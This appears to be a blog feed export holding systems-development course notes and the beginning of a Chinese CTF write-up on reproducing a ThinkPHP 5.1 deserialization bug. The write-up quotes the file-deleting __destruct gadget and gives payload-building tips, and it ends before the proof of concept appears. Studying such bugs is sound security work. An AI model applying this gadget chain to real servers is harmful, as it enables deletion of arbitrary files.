<li>Install, Deploy new system.</li>
</ul>
<h5 id="phase-5-Support"><a href="#phase-5-Support" class="headerlink" title="phase 5: Support"></a>phase 5: Support</h5><ul>
<li>Conduct post-implementation system review</li>
<li>Identify errors and enhancements</li>
<li>Monitor system performance</li>
</ul>
<h4 id="Sample-Question"><a href="#Sample-Question" class="headerlink" title="Sample Question"></a>Sample Question</h4><p>You are chatting with a friend about your job as an IT Developer, and they ask for a brief description on how IT systems are developed. Briefly describe the <strong>key phases of IT systems development, and the importance of each phase in the development process</strong>. (Seminar 1)</p>
<p>A: </p>
<ul>
<li><strong>Initiation</strong>: <ul>
<li>assess whether project is feasible.</li>
<li>whether you can build the system on time within the budget.</li>
<li>Is the expertise available?</li>
<li><strong>Importance</strong>: It determines whether you can go ahead or not, otherwise you waste your money.</li>
</ul>
</li>
<li><strong>Analysis</strong><ul>
<li>Determine detailed user requirements.</li>
<li>Create system models to confirm requirements and for design.</li>
<li>Perform <em>Build vs Buy</em> analysis.</li>
<li><strong>Importance</strong>: it is vital that you demonstrate to the client that you understand their requirements otherwise you can’t build the system they want to pay for.</li>
</ul>
</li>
<li><strong>Design</strong><ul>
<li>Define technical architecture.</li>
<li>Produce technical specs. Interface Design/ prototypes/ Security/ network</li>
<li>Create database.</li>
<li><strong>Importance</strong>: easy to maintain</li>
</ul>
</li>
<li><strong>Implementation</strong><ul>
<li>Build, Test, Validate if the system works.</li>
<li>Conduct Integration, System and Acceptance testing.</li>
<li>Create User Docs, Train users.</li>
<li>Install, Deploy new system.</li>
<li><strong>Importance</strong>: developers know what they’re building and users know that they are using. users need to know how to use the system. </li>
</ul>
</li>
<li><strong>Support</strong><ul>
<li>post-implementation review</li>
<li>Ready to fix errors, handle the system.</li>
<li><strong>Importance</strong>: be able to handle the system, you can get benefit and opportunity to reflect and learn.</li>
</ul>
</li>
</ul>
<h3 id="System-developers-Critical-skills-for-every-role"><a href="#System-developers-Critical-skills-for-every-role" class="headerlink" title="System developers - Critical skills for every role"></a>System developers - Critical skills for every role</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
<li><strong>Understanding business</strong> - awareness and sensitivity to the business processes<br>and needs that require technology in the first place</li>
<li><strong>Broad and up-to-date understanding of technology</strong> – can be invaluable in<br>creating the ‘best’ solutions for the organization</li>
<li><strong>Multiple Perspectives</strong> - The ability to understand that there are multiple<br>perspectives to solving a problems is required to find the best solution</li>
<li><strong>People/Soft Skills</strong> - the ability to interact with other people and to be a part of a<br>team</li>
<li><strong>Continuous Learning</strong> – essential in a high-change industry, like IT</li>
</ul>
<h4 id="Sample-Question-1"><a href="#Sample-Question-1" class="headerlink" title="Sample Question"></a>Sample Question</h4><p>You are attending a job interview as a System Developer. What skills are you going to showcase in your interview? (Seminar 1)</p>
<h2 id="S2-System-Development-Approaches-Agile-Software-Development-Stakeholder-management"><a href="#S2-System-Development-Approaches-Agile-Software-Development-Stakeholder-management" class="headerlink" title="S2: System Development Approaches, Agile Software Development, Stakeholder management"></a>S2: System Development Approaches, Agile Software Development, Stakeholder management</h2><h3 id="Approaches"><a href="#Approaches" class="headerlink" title="Approaches"></a>Approaches</h3><ul>
<li><p>predictive</p>
<ul>
<li>requirements -&gt; well understood&amp;defined</li>
<li>low tech risk</li>
</ul>
</li>
<li><p>adaptive</p>
<ul>
<li>requirements&amp;needs-&gt;uncertain</li>
<li>high tech risk</li>
</ul>
</li>
</ul>
<h3 id="Waterfall"><a href="#Waterfall" class="headerlink" title="Waterfall"></a>Waterfall</h3><ul>
<li>sequential stages(no overlap and iteration)</li>
<li>strong emphasis on planning and specification development</li>
<li>works well for clearly defined projects</li>
</ul>
<h3 id="Aglie"><a href="#Aglie" class="headerlink" title="Aglie"></a>Aglie</h3><ul>
<li><p>value(RVVV)<br>CP/IPT/WCD/CCCN</p>
<ul>
<li>responding to change over following a plan</li>
<li>value interactions and individuals over process and tools </li>
<li>value working software over comprehensive documentation</li>
<li>value costumer collaboration over contact negotiation </li>
</ul>
</li>
<li><p>12 Principles</p>
<ul>
<li>software is the primary goal</li>
<li>next effort is the secondary goal</li>
<li>…</li>
</ul>
</li>
<li><p>SCRUM(Agile frameworks) artifact</p>
<ul>
<li><p>product backlog</p>
<ul>
<li>the single source of requirements</li>
<li>cumulative list of the desired deliverable for the project - every feature, enhancement, bug fix, documentation requirement, every bit of work required by the team</li>
<li>prioritised to maximise value</li>
</ul>
</li>
<li><p>sprint backlog</p>
<ul>
<li>a list of tasks the team must complete to deliver an increment of functional software at the end of each Sprint</li>
<li>Once decided Team owns the Sprint Backlog - only they can decide on scope change.</li>
</ul>
</li>
<li><p>sprint burndown charts</p>
<ul>
<li>shows the total estimated work remaining for the entire forecasted sprint backlog against time</li>
</ul>
</li>
<li><p>task board</p>
<ul>
<li>allows visibility and transparency across the project</li>
<li>display the live status of team work and focus</li>
<li>Most have - Backlog, to-do, doing and done status</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="stakeholder-management"><a href="#stakeholder-management" class="headerlink" title="stakeholder management"></a>stakeholder management</h3><ul>
<li><p>define</p>
<ul>
<li><p>internal stakeholders</p>
<ul>
<li>within the organisation</li>
</ul>
</li>
<li><p>external stakeholders</p>
<ul>
<li>outside the organization</li>
</ul>
</li>
<li><p>operational stakeholders</p>
<ul>
<li>regularly interact with the system</li>
</ul>
</li>
<li><p>executive stakeholders</p>
<ul>
<li>don’t interact directly but use the information or have a financial interest </li>
</ul>
</li>
</ul>
</li>
<li><p>**prioritise and understand your stakeholders</p>
<p>- </p>
</li>
</ul>
<h2 id="S3-Investigating-System-Requirements-Information-Gathering-Techniques"><a href="#S3-Investigating-System-Requirements-Information-Gathering-Techniques" class="headerlink" title="S3: Investigating System Requirements/ Information Gathering Techniques"></a>S3: Investigating System Requirements/ Information Gathering Techniques</h2><h3 id="requirements-gathering"><a href="#requirements-gathering" class="headerlink" title="requirements gathering"></a>requirements gathering</h3><ul>
<li>investigating requirements using a range of techniques</li>
<li>developing a deep understanding of the business domain</li>
<li>defining what the solution needs to be to meet the requirements</li>
<li>requirements must be verified by the client</li>
</ul>
<h3 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h3><ul>
<li><p>functional requirements</p>
<ul>
<li>represents the activities a software system must perform</li>
<li>business functions that end-users carry out </li>
<li>expressed in terms of models</li>
</ul>
</li>
<li><p>non-functional requirements</p>
<ul>
<li>represents other characteristics from a software system </li>
<li>like constraints</li>
<li>performance goals(speed)</li>
</ul>
</li>
</ul>
<h3 id="information-gathering-techniques"><a href="#information-gathering-techniques" class="headerlink" title="information gathering techniques"></a>information gathering techniques</h3><ul>
<li><p>Interviewing users and stakeholders</p>
<ul>
<li><p>efficient way but time-consuming</p>
</li>
<li><p>how to prapre</p>
<ul>
<li><p>set clear objectives &amp; what information is needed</p>
</li>
<li><p>select appropriate stakeholders to interview</p>
</li>
<li><p>determine one-on-one/group interview</p>
</li>
<li><p>consider outside information - reports, forms, etc</p>
</li>
<li><p>review related documents and develop an agenda</p>
</li>
<li><p>documents objectives, nothing forgotten, logical progression</p>
</li>
<li><p>avoid long interviews - stakeholder do not have much time/ choose several shorter interviews</p>
</li>
<li><p>planning- interviewees has been sent Location, time, objectives &amp; list of questions</p>
</li>
<li><p>send reminders</p>
</li>
<li><p>arrive early</p>
</li>
<li><p>room is prepared for the interview</p>
</li>
<li><p>decide on a documentation method(get permission)</p>
<ul>
<li>take notes</li>
<li>video taped</li>
<li>recording</li>
</ul>
</li>
<li><p>follow up as needed - in future meetings or interviews</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>distributing and collecting questionnaires</p>
<ul>
<li><p>online, paper-based or email</p>
</li>
<li><p>advantages</p>
<ul>
<li>cover a wide spectrum of people</li>
<li>faster responses</li>
<li>low costs of distribution</li>
<li>good when people are widely dispersed</li>
<li>can give a preliminary insight into business </li>
</ul>
</li>
<li><p>disadvantages</p>
<ul>
<li>low response rate - not many people are willing to respond</li>
<li>not well for gathering the detailed information</li>
</ul>
</li>
</ul>
</li>
<li><p>Reviewing existing reports, forms and procedure descriptions</p>
<ul>
<li><p>existing business documents and procedures within organisation </p>
<ul>
<li>obtain preliminary understanding of precess </li>
<li>identify business rules, discrepancies, redundancies</li>
<li>be cautious of outdated material</li>
<li>can help guide interviews</li>
</ul>
</li>
</ul>
</li>
<li><p>Observation</p>
<ul>
<li><p>avoid hawthorne effect</p>
<ul>
<li><p>also referred to as the observer effect refers to a phenomenon, whereby workers :</p>
<ul>
<li>improve or modify an aspect of their behaviours/activities</li>
<li>or STOP WORKING in response to the fact that they are being observed</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Researching vendor solution</p>
<ul>
<li><p>many problems have been solved by other companies - have a look around for good ideas</p>
</li>
<li><p>positive contributions of vendor solutions</p>
<ul>
<li>frequently provide new ideas</li>
<li>may be the state of the art</li>
<li>cheaper and less risky</li>
</ul>
</li>
<li><p>danger</p>
<ul>
<li>may need to purchase solution before understanding problem</li>
<li>vendor support may not be there in the future</li>
<li>upgrade issues</li>
<li>may not address all business requirements</li>
</ul>
</li>
</ul>
</li>
<li><p>Prototyping</p>
</li>
<li><p>story-writing workshops</p>
</li>
</ul>
<h3 id="Investigating-documenting-system-requirements"><a href="#Investigating-documenting-system-requirements" class="headerlink" title="Investigating/documenting system requirements"></a>Investigating/documenting system requirements</h3><p>User Stories, Activity diagrams</p>
<ul>
<li><p>Models</p>
<ul>
<li><p>why do we use them?</p>
<ul>
<li><p>The model serves as an abstraction - an approximate representation of the real item</p>
</li>
<li><p>A simplified picture of complex reality</p>
</li>
<li><p>Reasons/advantages for modelling in system analysis </p>
<ul>
<li>reducing complexity of systems to be built by abstraction</li>
<li>communication with other development team members</li>
<li>communication with stakeholders/users</li>
<li>learning from the model process</li>
<li>documenting all the detailed of requirements for future maintenance/enhancement - represents some key aspects of the system being built</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>User stories</p>
<ul>
<li><p>define - what are they?</p>
<ul>
<li>short, simple description of a product feature - told from the perspective of the user who wants that feature</li>
<li>They go into product backlog</li>
</ul>
</li>
<li><p>reason - why User Stories</p>
<ul>
<li>encourages user communication and collaboration and real-time feedback</li>
<li>focus on end user value</li>
<li>planning is simplified - if it’s too big, you can’t estimate it</li>
<li>avoids locking in design detail too early - focus on WHAT - leaves the technical aspects to the developers, testers, etc.</li>
<li>Users do not need to be trained to understand User Stories</li>
<li>never out of date, just in time</li>
<li>eliminates weighty documentation - create what you need to deliver the story</li>
<li>easier to communicate with users</li>
</ul>
</li>
<li><p>how do you write</p>
<ul>
<li>As xxxx I want xxxxxx so that xxx</li>
<li>exam included</li>
</ul>
</li>
<li><p>good stories?(INVEST)</p>
<ul>
<li><p>independent</p>
<ul>
<li>not depend on other stories</li>
</ul>
</li>
<li><p>negotiable</p>
<ul>
<li>leave room for negotiation</li>
</ul>
</li>
<li><p>valuable</p>
<ul>
<li>gives value to the customer</li>
</ul>
</li>
<li><p>estimable</p>
<ul>
<li>should have enough information to be estimated</li>
</ul>
</li>
<li><p>small</p>
<ul>
<li>small enough to fit within a sprint</li>
</ul>
</li>
<li><p>Testable</p>
<ul>
<li>includes acceptance criteria to test that customer needs met.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Activity diagrams</p>
<ul>
<li><p>define</p>
<ul>
<li><p>a technique to describe a procedural logic, business process, and workflow.</p>
</li>
<li><p>describes</p>
<ul>
<li>user activities</li>
<li>the person who does each activity</li>
<li>the sequence of activities</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S5-Use-Case-Diagrams"><a href="#S5-Use-Case-Diagrams" class="headerlink" title="S5: Use Case Diagrams"></a>S5: Use Case Diagrams</h2><h3 id="Use-Case-Diagram"><a href="#Use-Case-Diagram" class="headerlink" title="Use Case Diagram"></a>Use Case Diagram</h3><ul>
<li><p>Actor</p>
<ul>
<li><p>Primary Actor</p>
<ul>
<li>using the system to achieve a goal</li>
</ul>
</li>
<li><p>Secondary Actor</p>
<ul>
<li>The system needs assistance to achieve the primary actor’s goal(s)</li>
</ul>
</li>
<li><p>generalisation</p>
<ul>
<li>inherits the behaviours of its parents and adds new behaviours</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Use-Case-Description"><a href="#Use-Case-Description" class="headerlink" title="Use Case Description"></a>Use Case Description</h3><ul>
<li>Identify the Actors</li>
<li>identify the goal</li>
<li>identify the pre-conditions</li>
<li>define the Post-conditions</li>
<li>describe Main Flows</li>
<li>describe Alternative Flows</li>
</ul>
<h2 id="S6-Domain-Class-Modelling"><a href="#S6-Domain-Class-Modelling" class="headerlink" title="S6: Domain Class Modelling"></a>S6: Domain Class Modelling</h2><h3 id="be-able-to-draw"><a href="#be-able-to-draw" class="headerlink" title="be able to draw"></a>be able to draw</h3><h2 id="S7-Prototyping"><a href="#S7-Prototyping" class="headerlink" title="S7: Prototyping"></a>S7: Prototyping</h2><p>Usability of systems</p>
<h3 id="Prototyping"><a href="#Prototyping" class="headerlink" title="Prototyping"></a>Prototyping</h3><ul>
<li><p>Definition of Prototyping</p>
<ul>
<li>a process of quickly mocking up the future system functionality</li>
<li>use visuals to describe how a system should behave and look</li>
<li>can be horizontal or vertical</li>
<li>can be experimental or evolutionary</li>
</ul>
</li>
<li><p>Advantage of Prototyping</p>
<ul>
<li>explore the idea before you invest in them(improve communication, reduce risk)</li>
<li>saves time and money</li>
<li>proof of concept</li>
<li>technical and design exploration</li>
</ul>
</li>
<li><p>Disadvantage of Prototyping</p>
<ul>
<li>make the users think the system is developed</li>
<li>create a system that does not scale</li>
<li>Waste time(as developers spend much time making throw away prototypes looks good)</li>
</ul>
</li>
</ul>
<h3 id="Usability"><a href="#Usability" class="headerlink" title="Usability"></a>Usability</h3><ul>
<li><p>Definition</p>
<ul>
<li><p>the extent to which a product can be used by specified users to achieve specified goals with effectiveness, efficiency, and satisfaction</p>
<ul>
<li>Effectiveness: accuracy and completeness</li>
<li>Efficiency: resources expended in relation to effectiveness</li>
<li>Satisfaction: the comfort and acceptability of the work system to its users.</li>
</ul>
</li>
</ul>
</li>
<li><p>why is it important</p>
<ul>
<li>help improve user effciency</li>
<li>can make users feel more in control</li>
<li>help improve sales of products</li>
<li>help improve usage of the system</li>
<li>can improve user satisfication</li>
</ul>
</li>
<li><p>usability of an interface design<br>evaluating usability</p>
<ul>
<li>Learnability: how easy is it for users to accomplish basic tasks at the first time?</li>
<li>Efficiency: once users learned the design, how quickly they can perform the task</li>
<li>Memorability: When users return to the design after of a period of not using it, how easily they can re-establish proficiency</li>
<li>Errors: how many errors do users make?how severe are these errors? How easily can they recover from the errors?</li>
<li>Satisfaction: how pleasant is it to use the design</li>
</ul>
</li>
<li><p>type of usability of evaluation</p>
<ul>
<li><p>formative evaluation</p>
<ul>
<li>Users experience prototypes and identify usability problems </li>
<li>Evaluation by HCI expert </li>
</ul>
</li>
<li><p>Summative evaluation</p>
<ul>
<li>takes place post development</li>
<li>quantitive results collected</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S8-Interface-Design-Guidelines-and-tips"><a href="#S8-Interface-Design-Guidelines-and-tips" class="headerlink" title="S8: Interface Design Guidelines and tips"></a>S8: Interface Design Guidelines and tips</h2><h3 id="guidlines"><a href="#guidlines" class="headerlink" title="guidlines"></a>guidlines</h3><ul>
<li><p>Ben Shneiderman’s 8 Golden rules</p>
<ul>
<li>Ben Shneiderman’s 8 Golden rules</li>
</ul>
</li>
<li><p>Jakob Nielsen’s 10 heuristics</p>
</li>
<li><p>Don Norman’s Guidlines</p>
</li>
</ul>
<h3 id="personas"><a href="#personas" class="headerlink" title="personas"></a>personas</h3><ul>
<li><p>why important</p>
<ul>
<li><p>Build Empathy</p>
<ul>
<li>Help users seem more real - designers empathise and build for their users</li>
</ul>
</li>
<li><p>Provide direction for making design decisions</p>
<ul>
<li>help focus design decision on users</li>
</ul>
</li>
<li><p>communicate Research Finding</p>
<ul>
<li>Team on the same page communicate the information in an easy to understand format</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="S9-Use-Case-Realisation"><a href="#S9-Use-Case-Realisation" class="headerlink" title="S9: Use Case Realisation"></a>S9: Use Case Realisation</h2><h3 id="Quality-of-design-models"><a href="#Quality-of-design-models" class="headerlink" title="Quality of design models"></a>Quality of design models</h3><ul>
<li><p>cohesion measures the consistency of functions in a class</p>
<ul>
<li><p>a single focus of class</p>
</li>
<li><p>a single focus of the methods in a class</p>
</li>
<li><p>no methods with multiple functions</p>
</li>
<li><p>low cohesion(Tight)</p>
<ul>
<li>hard to maintain</li>
<li>hard to reuse</li>
<li>hard to understand</li>
</ul>
</li>
</ul>
</li>
<li><p>coupling</p>
<ul>
<li><p>Qualitative measure of how closely classes are linked. </p>
</li>
<li><p>low or loos coupling make system easier to understand and maintain, minimal ripple effort</p>
</li>
<li><p>Tight coupling often leads to low cohesion</p>
<ul>
<li>increase the extent to which objects are independent</li>
<li>can causes ripple trough effects</li>
<li>reduces the ability to reuse parts of the system</li>
<li>hard to maintain</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Design-Class-Diagram"><a href="#Design-Class-Diagram" class="headerlink" title="Design Class Diagram"></a>Design Class Diagram</h3><ul>
<li>design and document the programming classes that will be built for the new system</li>
<li>shows set of problem domain classes and their association relationships</li>
</ul>
<h2 id="S10-Security-amp-Testing"><a href="#S10-Security-amp-Testing" class="headerlink" title="S10: Security &amp; Testing"></a>S10: Security &amp; Testing</h2><h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><ul>
<li><p>definition</p>
<ul>
<li><p>represents the process of examining a component, subsystem, or system to: </p>
<ul>
<li>if it determines any defect</li>
<li>uncover design flows and limitations</li>
<li>verify that it is “fits for purpose” and meets the needs of the Business/End User</li>
<li>reduce the risk of failure</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing process in different development approaches</p>
<ul>
<li><p>Waterfall</p>
<ul>
<li>generally all testing and quality control points late in the project </li>
</ul>
</li>
<li><p>Agile</p>
<ul>
<li>Testing is integrated throughout the lifecycle; testing the software continuously throughout  its development</li>
<li>NO a separate test phase </li>
<li>Developers write automated repeatable unit tests to validate their code</li>
<li>Supports the principle of small, iterative, incremental releases.</li>
<li>Testing is done as part of the build. Ensure that all features are working correctly each time the build is produced.</li>
<li>integration is done as you go</li>
<li>the purpose of these principles is to keep the software in releasable condition thought the development, so it can be shipped whenever it’s appropriate.</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing methods</p>
<ul>
<li><p>Black Box Testing</p>
<ul>
<li>without reference to the internal structure of the component and system </li>
</ul>
</li>
<li><p>White Box Testing</p>
<ul>
<li>uses an internal perspective of the system to design test cases based on internal structure </li>
</ul>
</li>
<li><p>Grey Box Testing</p>
<ul>
<li>increase testing coverage</li>
</ul>
</li>
</ul>
</li>
<li><p>Testing type</p>
<ul>
<li>functional testing</li>
<li>regression testing</li>
<li>static &amp; dynamic testing</li>
<li>performance &amp; load &amp; stress testing - usability testing</li>
<li>accessibility testing</li>
<li>security testing</li>
<li>Backup&amp;Recovery testing</li>
</ul>
</li>
</ul>
<h2 id="S11-Implementation-amp-Maintainance"><a href="#S11-Implementation-amp-Maintainance" class="headerlink" title="S11. Implementation &amp; Maintainance"></a>S11. Implementation &amp; Maintainance</h2><h3 id="Implementation-phase-activities"><a href="#Implementation-phase-activities" class="headerlink" title="Implementation phase activities"></a>Implementation phase activities</h3><ul>
<li><p>implementation Planning</p>
<ul>
<li>review acceptance Checklist, Prepare Implementation Schedule </li>
</ul>
</li>
<li><p>Build the system or buy the system</p>
<ul>
<li>will result in a varied implementation path</li>
</ul>
</li>
<li><p>test the system</p>
<ul>
<li>System Testing(functional and performance) Acceptance Testing</li>
</ul>
</li>
<li><p>finalise documentation</p>
<ul>
<li>system documentation</li>
<li>user documentation</li>
</ul>
</li>
<li><p>get ready for the system to go into Production</p>
<ul>
<li>data conversion</li>
<li>configure the production environment</li>
<li>conduct trainning</li>
</ul>
</li>
<li><p>Deploy the system</p>
<ul>
<li>install/deploy the system, Monitor Operations, benchmark Testing, tune the system</li>
</ul>
</li>
<li><p>wrapup</p>
<ul>
<li>Opperation handover</li>
<li>transition support </li>
<li>system closure</li>
<li>post-implementation review</li>
</ul>
</li>
</ul>
<h3 id="data-conversion"><a href="#data-conversion" class="headerlink" title="data conversion"></a>data conversion</h3><ul>
<li>Original</li>
<li>consolidation</li>
<li>Cleansing</li>
<li>Update</li>
<li>Final Load</li>
</ul>
<h3 id="trainning"><a href="#trainning" class="headerlink" title="trainning"></a>trainning</h3><ul>
<li><p>consideration</p>
<ul>
<li>users, number of users</li>
<li>existing skills level - on-going level</li>
<li>who conduct the meeting</li>
<li>when/where training should be conducted</li>
<li>training documentation</li>
<li>need supported User Manager who committed allocating time for training</li>
</ul>
</li>
</ul>
<h3 id="deployment"><a href="#deployment" class="headerlink" title="deployment"></a>deployment</h3><ul>
<li><p>Direct deployment</p>
<ul>
<li><p>install a new system</p>
</li>
<li><p>This approach is meaningful when:</p>
<ul>
<li><p>the system is not replacing any other system</p>
</li>
<li><p>– the old system is judged absolutely without value</p>
</li>
<li><p>– the new system is completely different from the old and comparisons would be meaningless</p>
</li>
<li><p>– the old system is either very small and/or very simple</p>
</li>
</ul>
</li>
<li><p>advantage</p>
<ul>
<li>Simple, fewer logistic issues to manage, costs minimised</li>
</ul>
</li>
</ul>
</li>
<li><p>Parallel deployment</p>
<ul>
<li><p>old and new systems both operate for an extended period of time</p>
</li>
<li><p>advantage</p>
<ul>
<li>Risk low if problems occurs – continual backup</li>
</ul>
</li>
<li><p>disadvantage</p>
<ul>
<li>High cost: increased personnel, extra space, increased managerial and logistic complexity</li>
</ul>
</li>
</ul>
</li>
<li><p>Pilot deployment(multiple locations)</p>
<ul>
<li><p>old and new systems operated concurrectly</p>
</li>
<li><p>only part of organisation tries out the new system</p>
</li>
<li><p>The pilot system must prove itself at the test site</p>
</li>
<li><p>advantage</p>
<ul>
<li>Risks relatively low if problems occur</li>
<li>Errors are localised to pilot site</li>
<li>Can be used to train users before implementation at their own site</li>
</ul>
</li>
<li><p>disadvantage</p>
<ul>
<li>Lack of consistency between different parts of the organisation</li>
</ul>
</li>
</ul>
</li>
<li><p>Phased deployment(multiple functions)</p>
<ul>
<li><p>A New system installed in series of steps or phase, where each phase adds components to the existing system</p>
</li>
<li><p>advantage</p>
<ul>
<li>Reduces risk because phase failure is less serious than system failure</li>
<li>Lower costs for earlier results</li>
<li>Benefits can be realised earlier</li>
<li>Rate of change minimised for users</li>
</ul>
</li>
<li><p>Disadvantage</p>
<ul>
<li>Multiple phases cause more activities, milestones, and management complexity for entire effort</li>
<li>Close control of systems development is essential</li>
<li>Costs associated with the development of temporary interfaces to old systems</li>
<li>Limited business applicability</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Maintenance-closure"><a href="#Maintenance-closure" class="headerlink" title="Maintenance/closure"></a>Maintenance/closure</h3><ul>
<li><p>Corrective maintenance</p>
<ul>
<li>corrects analysis, design, and implementation errors</li>
<li>focus on moving defects</li>
</ul>
</li>
<li><p>Adaptive maintenance</p>
<ul>
<li>to satisfy changes in the new environment, changing business needs or new user requirements</li>
</ul>
</li>
<li><p>Perfective maintenance</p>
<ul>
<li>to enhance performance, maintainability, usability</li>
<li>To meet user requirements not previously recognised or given high<br>priority</li>
</ul>
</li>
<li><p>Preventative maintenance</p>
<ul>
<li>identify and fix any<br>potential problems noted while fixing other errors</li>
</ul>
</li>
</ul>
<h3 id="Change-Management-system"><a href="#Change-Management-system" class="headerlink" title="Change Management system"></a>Change Management system</h3><ul>
<li>manage change effectively </li>
<li>reduce the confusion and complexity of<br>developing and maintaining systems</li>
</ul>
<h3 id="why-post-implementation-review-important"><a href="#why-post-implementation-review-important" class="headerlink" title="why post implementation review important"></a>why post implementation review important</h3><ul>
<li>post implementation analyses what went wrong and right with a project </li>
<li>compare costs of development and operation against original estimates</li>
<li>look at original requirements and evaluate how well they were met</li>
<li>compare original and actual benefits</li>
<li>new system reviewed to see whether more of original or additional benefits can be realised</li>
</ul>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Systems Development</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.1反序列化漏洞复现</title>
    <url>/2021/07/08/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概练习了下一些简单的PHP反序列化漏洞以后，决定尝试一下漏洞复现。正好做CTF的时候看到了<code>ThinkPHP</code>反序列化漏洞的复现题，结果因为一些很小的问题（还是经验不足）废了很多很多时间，踩了很多坑，当然最后也收获了很多，对<strong>php反序列化漏洞</strong>有了新的认识。</p>
<p>看了下README，<img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708232435849.png" alt="image-20210708232435849">得知是5.1版本的，网上有各个师父的WP，看了很久终于搞明白了。</p>
<span id="more"></span>

<h1 id="PHP审计环境安装"><a href="#PHP审计环境安装" class="headerlink" title="PHP审计环境安装"></a>PHP审计环境安装</h1><p>为了方便，参考网上的资料后，我在windows系统上安装了<code>XAMPP</code>和<code>PhpStorm</code>,<code>PhpStrom</code>的配置就不说了，具体参考<a href="https://www.jianshu.com/p/eff16205d453">PHPstorm配置PHP运行环境</a>，不过我在配置运行的时候遇到很多坑，比如在某个php文件点击运行的时候，右上角设置的<code>configuration</code>会自动改变，导致我以为网站运行不起来。不过<code>PhpStorm</code>还是挺好用的，英语输入法下<code>ctrl+shift+f</code>可全局搜索关键词（这个快捷键会自动转换成windows系统拼音的繁体）</p>
<h1 id="任意文件删除漏洞复现"><a href="#任意文件删除漏洞复现" class="headerlink" title="任意文件删除漏洞复现"></a>任意文件删除漏洞复现</h1><h2 id="发现、分析过程"><a href="#发现、分析过程" class="headerlink" title="发现、分析过程"></a>发现、分析过程</h2><p>拿到源码的第一件事，我是搜索<code>unserialize</code>,后来在<code>index.php</code>发现了<img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234233838.png" alt="image-20210708234233838">，所以我们可以通过<code>POST</code>请求来发送恶意代码。</p>
<p>接下来全局搜索魔法函数 <code>__destruct</code>,出现了四个结果</p>
<p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234436994.png" alt="image-20210708234436994"></p>
<p>发现只有Windows.php下的函数有利用价值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();<span class="comment">//此处是个好东西</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>removeFiles()</code>之后，发现该方法依然在windows这个class里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;<span class="comment">//发现用到了$files这个attribute</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;<span class="comment">//检测如果这个文件存在</span></span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);<span class="comment">//则删除这个文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着我们可以构造$files，让他执行<code>removeFiles()</code>来删除任意文件</p>
<h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>坑点一：需要注意的是，我们需要使用与Windows类相同的namespace（命名空间），我没加，导致在这卡了好久好久。</p>
<p>坑点二：序列化后的对象用<code>file_put_contents()</code>打出来乱码，发现是加了<code>namespace</code>后就会乱码，具体原因没有深入探究，改用echo就好了。</p>
<p>坑点三：加入<code>namespace</code>后，private类型attribute的格式发生了变化，变成了<code>%00namespace\类名\%00属性名</code>，一个小诀窍，记不住可以右键–查看网页源代码</p>
<p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210709000912218.png" alt="image-20210709000912218"></p>
<p><strong>最后POC如下</strong></p>
